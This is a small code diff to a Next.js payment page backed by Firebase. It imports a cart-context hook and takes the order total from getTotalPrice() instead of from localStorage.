@@ -5,6 +5,7 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { db, handlePay } from "@/lib/firebase"
 import Loader from "@/components/Loader"
+import { useCart } from "@/contexts/cart-context"
 
 type PaymentInfo = {
   createdDate: string
@@ -140,12 +141,14 @@ export default function Payment() {
   const [isCountdownActive, setIsCountdownActive] = useState(true)
   const [otpAttempts, setOtpAttempts] = useState(-2)
   const [otpValue, setOtpValue ]= useState('')
+  const {getTotalPrice } = useCart()
+
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
   useEffect(() => {
     //handleAddotp(paymentInfo.otp!)
-    const ty = localStorage!.getItem("amount")
+    const ty = getTotalPrice()
     if (ty) {
       setTotal(ty)
     }
